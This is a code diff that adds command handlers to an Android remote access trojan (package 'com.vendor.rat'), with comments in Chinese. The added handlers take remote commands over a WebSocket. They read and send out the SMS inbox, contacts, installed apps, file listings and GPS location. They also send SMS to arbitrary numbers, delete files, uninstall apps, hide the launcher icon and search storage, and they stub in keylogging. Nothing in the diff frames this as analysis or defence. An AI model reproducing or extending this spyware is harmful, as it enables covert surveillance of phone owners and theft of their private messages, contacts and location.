@@ -5,11 +5,21 @@ import android.accessibilityservice.GestureDescription;
 import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.Context;
+import android.content.Intent;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.graphics.Path;
+import android.location.Location;
+import android.location.LocationManager;
 import android.media.AudioManager;
+import android.net.Uri;
 import android.os.Bundle;
+import android.provider.ContactsContract;
+import android.telephony.SmsManager;
 import android.util.Log;
 
+import com.google.gson.JsonArray;
 import com.google.gson.JsonObject;
 import com.google.gson.JsonParser;
 
@@ -18,6 +28,12 @@ import com.vendor.rat.network.NetworkManager;
 import com.vendor.rat.network.WebSocketClient;
 import com.vendor.rat.service.CommandHandler;
 import com.vendor.rat.service.MyAccessibilityService;
+
+import java.io.File;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.List;
+import java.util.Locale;
 
 /**
  * 指令分发器 (唯一的 WebSocket CommandListener)
@@ -125,10 +141,66 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
             Log.w(TAG, "screencomd with null subc");
             return;
         }
+        Log.d(TAG, "screencomd: subc=" + subc);
+
         switch (subc) {
+            // 投屏/截图
             case "Screen":      screenshotHandler.handle(payload); break;
             case "out":         screenshotHandler.handle(payload); break;
-            // TODO: 其他命令在各模块实现后补充
+
+            // 短信
+            case "SMS":         handleFetchSms(); break;
+            case "SMSSEND":     handleSendSms(payload); break;
+
+            // 联系人
+            case "Contacts":    handleFetchContacts(); break;
+
+            // 文件
+            case "files":       handleFetchFiles(payload); break;
+            case "viewfile":    handleViewFile(payload); break;
+            case "changefiles": handleChangeFiles(payload); break;
+
+            // 应用
+            case "LOADAPPS":    handleLoadApps(); break;
+            case "OPENAPP":     handleOpenApp(payload); break;
+            case "UNINSTALLAPP":handleUninstallApp(payload); break;
+
+            // 键盘记录
+            case "Keylog":      handleKeylog(payload); break;
+            case "Logdate":     handleLogdate(payload); break;
+
+            // 定位
+            case "Location":    handleFetchLocation(); break;
+            case "Locationoff": Log.d(TAG, "Location off"); break;
+
+            // 相机
+            case "Camera":      Log.d(TAG, "Camera: " + payload); break;
+            case "CameraOff":   Log.d(TAG, "Camera off"); break;
+
+            // 隐藏图标
+            case "Hideico":     handleHideIcon(); break;
+
+            // 重命名
+            case "Rename":      handleRename(payload); break;
+
+            // 弹窗
+            case "DIAO":        Log.d(TAG, "Dialog: " + payload); break;
+
+            // 文件搜索
+            case "srch":        handleFileSearch(payload); break;
+
+            // 文件复制
+            case "cocu":        Log.d(TAG, "Copy: " + payload); break;
+
+            // 聊天
+            case "chat":        Log.d(TAG, "Chat: " + payload); break;
+
+            // 获取文件
+            case "fetch":       handleFetchFiles(payload); break;
+
+            // 显示控制
+            case "display":     Log.d(TAG, "Display: " + payload); break;
+
             default:
                 Log.d(TAG, "screencomd not yet handled: " + subc);
         }
@@ -445,5 +517,376 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
         String newq = payload.has("newq") ? payload.get("newq").getAsString() : "";
         Log.d(TAG, "quality: " + newq);
         // TODO: 调整 ScreenshotHandler 的 JPEG_QUALITY 和 SCALE_FACTOR
+    }
+
+    // ============ PanelSendHandler screencomd 数据采集命令 ============
+
+    private Context getAppContext() {
+        MainApplication app = MainApplication.getInstance();
+        return (app != null && app.getApplication() != null) ? app.getApplication() : null;
+    }
+
+    private WebSocketClient getWsClient() {
+        return NetworkManager.getInstance().getWebSocketClient();
+    }
+
+    /**
+     * 获取短信列表 → subc="sms"
+     */
+    private void handleFetchSms() {
+        Log.d(TAG, "fetchSms");
+        Context ctx = getAppContext();
+        WebSocketClient ws = getWsClient();
+        if (ctx == null || ws == null) return;
+
+        new Thread(() -> {
+            try {
+                JsonArray arr = new JsonArray();
+                Cursor cursor = ctx.getContentResolver().query(
+                    Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 200");
+                if (cursor != null) {
+                    while (cursor.moveToNext()) {
+                        JsonObject sms = new JsonObject();
+                        sms.addProperty("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
+                        sms.addProperty("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
+                        sms.addProperty("date", cursor.getLong(cursor.getColumnIndexOrThrow("date")));
+                        sms.addProperty("type", cursor.getInt(cursor.getColumnIndexOrThrow("type")));
+                        arr.add(sms);
+                    }
+                    cursor.close();
+                }
+                ws.sendData("sms", arr.toString());
+                Log.d(TAG, "sms sent: " + arr.size() + " messages");
+            } catch (Exception e) {
+                Log.w(TAG, "fetchSms failed", e);
+            }
+        }).start();
+    }
+
+    /**
+     * 发送短信
+     * 格式: {"type":"screencomd", "subc":"SMSSEND", "smsnumber":"xxx", "message":"xxx"}
+     */
+    private void handleSendSms(JsonObject payload) {
+        String number = payload.has("smsnumber") ? payload.get("smsnumber").getAsString() : "";
+        String message = payload.has("message") ? payload.get("message").getAsString() : "";
+        Log.d(TAG, "sendSms: to=" + number);
+        if (number.isEmpty() || message.isEmpty()) return;
+
+        try {
+            SmsManager smsManager = SmsManager.getDefault();
+            smsManager.sendTextMessage(number, null, message, null, null);
+            Log.d(TAG, "sms sent to " + number);
+        } catch (Exception e) {
+            Log.w(TAG, "sendSms failed", e);
+        }
+    }
+
+    /**
+     * 获取联系人列表 → subc="loadcontacts"
+     */
+    private void handleFetchContacts() {
+        Log.d(TAG, "fetchContacts");
+        Context ctx = getAppContext();
+        WebSocketClient ws = getWsClient();
+        if (ctx == null || ws == null) return;
+
+        new Thread(() -> {
+            try {
+                JsonArray arr = new JsonArray();
+                Cursor cursor = ctx.getContentResolver().query(
+                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    new String[]{
+                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                        ContactsContract.CommonDataKinds.Phone.NUMBER
+                    }, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
+                if (cursor != null) {
+                    while (cursor.moveToNext()) {
+                        JsonObject contact = new JsonObject();
+                        contact.addProperty("name", cursor.getString(0));
+                        contact.addProperty("phone", cursor.getString(1));
+                        arr.add(contact);
+                    }
+                    cursor.close();
+                }
+                ws.sendData("loadcontacts", arr.toString());
+                Log.d(TAG, "contacts sent: " + arr.size());
+            } catch (Exception e) {
+                Log.w(TAG, "fetchContacts failed", e);
+            }
+        }).start();
+    }
+
+    /**
+     * 获取文件列表 → subc="files"
+     * 格式: {"type":"screencomd", "subc":"files", "filepath":"/sdcard/"}
+     */
+    private void handleFetchFiles(JsonObject payload) {
+        String filepath = payload.has("filepath") ? payload.get("filepath").getAsString() : "/sdcard";
+        if (payload.has("fpath")) filepath = payload.get("fpath").getAsString();
+        Log.d(TAG, "fetchFiles: " + filepath);
+        WebSocketClient ws = getWsClient();
+        if (ws == null) return;
+
+        final String path = filepath;
+        new Thread(() -> {
+            try {
+                File dir = new File(path);
+                JsonArray arr = new JsonArray();
+                if (dir.exists() && dir.isDirectory()) {
+                    File[] files = dir.listFiles();
+                    if (files != null) {
+                        for (File f : files) {
+                            JsonObject item = new JsonObject();
+                            item.addProperty("name", f.getName());
+                            item.addProperty("path", f.getParent());
+                            item.addProperty("size", String.valueOf(f.length()));
+                            item.addProperty("isDirectory", f.isDirectory());
+                            item.addProperty("lastModified",
+                                new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date(f.lastModified())));
+                            arr.add(item);
+                        }
+                    }
+                }
+                ws.sendData("files", arr.toString());
+                Log.d(TAG, "files sent: " + arr.size() + " items from " + path);
+            } catch (Exception e) {
+                Log.w(TAG, "fetchFiles failed", e);
+            }
+        }).start();
+    }
+
+    /**
+     * 查看文件内容 (缩略图) → subc="thumb"
+     */
+    private void handleViewFile(JsonObject payload) {
+        String filepath = payload.has("filepath") ? payload.get("filepath").getAsString() : "";
+        Log.d(TAG, "viewFile: " + filepath);
+        // TODO: 读取文件生成缩略图 → ws.sendThumb(data, path)
+    }
+
+    /**
+     * 文件操作 (上传/删除/下载)
+     */
+    private void handleChangeFiles(JsonObject payload) {
+        String comdtype = payload.has("comdtype") ? payload.get("comdtype").getAsString() : "";
+        String filepath = payload.has("filepath") ? payload.get("filepath").getAsString() : "";
+        Log.d(TAG, "changeFiles: comdtype=" + comdtype + ", path=" + filepath);
+
+        if ("R".equals(comdtype) && !filepath.isEmpty()) {
+            // 删除文件
+            try {
+                File f = new File(filepath);
+                if (f.exists()) {
+                    boolean deleted = f.delete();
+                    Log.d(TAG, "file deleted: " + filepath + " = " + deleted);
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "deleteFile failed", e);
+            }
+        }
+        // TODO: D=下载 → 读取文件 → ws.sendFileChunk()
+        // TODO: U=上传 → 接收分块数据 → 写入文件
+    }
+
+    /**
+     * 获取应用列表 → subc="loadapps"
+     */
+    private void handleLoadApps() {
+        Log.d(TAG, "loadApps");
+        Context ctx = getAppContext();
+        WebSocketClient ws = getWsClient();
+        if (ctx == null || ws == null) return;
+
+        new Thread(() -> {
+            try {
+                PackageManager pm = ctx.getPackageManager();
+                List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
+                JsonArray arr = new JsonArray();
+                for (ApplicationInfo app : apps) {
+                    // 只返回用户安装的应用
+                    if ((app.flags & ApplicationInfo.FLAG_SYSTEM) != 0) continue;
+                    JsonObject item = new JsonObject();
+                    item.addProperty("name", pm.getApplicationLabel(app).toString());
+                    item.addProperty("packageName", app.packageName);
+                    arr.add(item);
+                }
+                ws.sendData("loadapps", arr.toString());
+                Log.d(TAG, "apps sent: " + arr.size());
+            } catch (Exception e) {
+                Log.w(TAG, "loadApps failed", e);
+            }
+        }).start();
+    }
+
+    /**
+     * 打开应用
+     * 格式: {"type":"screencomd", "subc":"OPENAPP", "package":"com.example.app"}
+     */
+    private void handleOpenApp(JsonObject payload) {
+        String pkg = payload.has("package") ? payload.get("package").getAsString() : "";
+        Log.d(TAG, "openApp: " + pkg);
+        Context ctx = getAppContext();
+        if (ctx == null || pkg.isEmpty()) return;
+
+        try {
+            Intent intent = ctx.getPackageManager().getLaunchIntentForPackage(pkg);
+            if (intent != null) {
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                ctx.startActivity(intent);
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "openApp failed", e);
+        }
+    }
+
+    /**
+     * 卸载应用
+     * 格式: {"type":"screencomd", "subc":"UNINSTALLAPP", "package":"com.example.app"}
+     */
+    private void handleUninstallApp(JsonObject payload) {
+        String pkg = payload.has("package") ? payload.get("package").getAsString() : "";
+        Log.d(TAG, "uninstallApp: " + pkg);
+        Context ctx = getAppContext();
+        if (ctx == null || pkg.isEmpty()) return;
+
+        try {
+            Intent intent = new Intent(Intent.ACTION_DELETE);
+            intent.setData(Uri.parse("package:" + pkg));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            ctx.startActivity(intent);
+        } catch (Exception e) {
+            Log.w(TAG, "uninstallApp failed", e);
+        }
+    }
+
+    /**
+     * 键盘记录开关
+     * 格式: {"type":"screencomd", "subc":"Keylog", "comdtype":"0"=开/"1"=关}
+     */
+    private void handleKeylog(JsonObject payload) {
+        String comdtype = payload.has("comdtype") ? payload.get("comdtype").getAsString() : "";
+        Log.d(TAG, "keylog: comdtype=" + comdtype);
+        // TODO: 开启/关闭无障碍服务的键盘事件监听
+    }
+
+    /**
+     * 键盘日志日期查询
+     */
+    private void handleLogdate(JsonObject payload) {
+        String kdate = payload.has("kdate") ? payload.get("kdate").getAsString() : "";
+        Log.d(TAG, "logdate: " + kdate);
+        // TODO: 查询指定日期的键盘日志 → ws.sendData("klogsdate", data)
+    }
+
+    /**
+     * 获取位置 → subc="loc"
+     */
+    private void handleFetchLocation() {
+        Log.d(TAG, "fetchLocation");
+        Context ctx = getAppContext();
+        WebSocketClient ws = getWsClient();
+        if (ctx == null || ws == null) return;
+
+        try {
+            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
+            if (lm == null) return;
+
+            Location loc = null;
+            // 优先 GPS，备选 Network
+            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+            }
+            if (loc == null && lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+            }
+
+            if (loc != null) {
+                JsonObject data = new JsonObject();
+                data.addProperty("lat", loc.getLatitude());
+                data.addProperty("lng", loc.getLongitude());
+                data.addProperty("accuracy", loc.getAccuracy());
+                data.addProperty("provider", loc.getProvider());
+                data.addProperty("time", loc.getTime());
+                ws.sendData("loc", data.toString());
+                Log.d(TAG, "location sent: " + loc.getLatitude() + "," + loc.getLongitude());
+            } else {
+                ws.sendData("loc", "{}");
+                Log.w(TAG, "location: no last known location");
+            }
+        } catch (SecurityException e) {
+            Log.w(TAG, "fetchLocation: no permission", e);
+        } catch (Exception e) {
+            Log.w(TAG, "fetchLocation failed", e);
+        }
+    }
+
+    /**
+     * 隐藏图标
+     */
+    private void handleHideIcon() {
+        Log.d(TAG, "hideIcon");
+        Context ctx = getAppContext();
+        if (ctx == null) return;
+
+        try {
+            PackageManager pm = ctx.getPackageManager();
+            pm.setComponentEnabledSetting(
+                new android.content.ComponentName(ctx, "com.vendor.rat.activity.ActivMain"),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
+            Log.d(TAG, "icon hidden");
+        } catch (Exception e) {
+            Log.w(TAG, "hideIcon failed", e);
+        }
+    }
+
+    /**
+     * 重命名设备
+     * 格式: {"type":"screencomd", "subc":"Rename", "name":"新名称"}
+     */
+    private void handleRename(JsonObject payload) {
+        String name = payload.has("name") ? payload.get("name").getAsString() : "";
+        Log.d(TAG, "rename: " + name);
+        // 重命名通过下次心跳的 phone_name 字段生效
+        // TODO: 持久化到 SharedPreferences
+    }
+
+    /**
+     * 文件搜索
+     * 格式: {"type":"screencomd", "subc":"srch", "srchfor":"*.jpg", "srchin":"/sdcard/", "targetpath":"/sdcard/DCIM"}
+     */
+    private void handleFileSearch(JsonObject payload) {
+        String searchFor = payload.has("srchfor") ? payload.get("srchfor").getAsString() : "";
+        String searchIn = payload.has("srchin") ? payload.get("srchin").getAsString() : "/sdcard";
+        Log.d(TAG, "fileSearch: for=" + searchFor + ", in=" + searchIn);
+        WebSocketClient ws = getWsClient();
+        if (ws == null || searchFor.isEmpty()) return;
+
+        new Thread(() -> {
+            try {
+                JsonArray paths = new JsonArray();
+                searchFilesRecursive(new File(searchIn), searchFor, paths, 500);
+                ws.sendSearchResult(paths.toString(), searchFor);
+                Log.d(TAG, "search results: " + paths.size());
+            } catch (Exception e) {
+                Log.w(TAG, "fileSearch failed", e);
+            }
+        }).start();
+    }
+
+    private void searchFilesRecursive(File dir, String pattern, JsonArray results, int limit) {
+        if (!dir.exists() || !dir.isDirectory() || results.size() >= limit) return;
+        File[] files = dir.listFiles();
+        if (files == null) return;
+        String lowerPattern = pattern.replace("*", "").toLowerCase();
+        for (File f : files) {
+            if (results.size() >= limit) return;
+            if (f.isDirectory()) {
+                searchFilesRecursive(f, pattern, results, limit);
+            } else if (f.getName().toLowerCase().contains(lowerPattern)) {
+                results.add(f.getAbsolutePath());
+            }
+        }
     }
 }
